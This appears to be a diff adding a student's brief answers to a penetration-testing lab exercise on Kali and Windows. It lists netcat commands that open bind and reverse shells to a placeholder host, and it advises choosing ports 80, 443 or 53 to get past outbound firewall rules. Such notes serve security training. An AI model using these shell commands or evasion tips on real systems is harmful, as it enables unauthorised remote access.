@@ -1,0 +1,15 @@
+1.
+nc -nv x.x.x.x 4444 -e /bin/bash
+nc -nv x.x.x.x 4444 -e cmd.exe
+nc -nlvp 4444 -e cmd.exe
+nc -nlvp 4444 -e /bin/bash
+
+2.
+Reverse shells are more stable, but require a little more work. 
+
+3.
+I transferred a .txt to windows then back to Kali. I also transferred nc.exe
+
+4.
+The firewall drops outbound connections if you play with the settings. 
+Tweaking the reverse to land on 80 or 443 is better. 53 is also good.
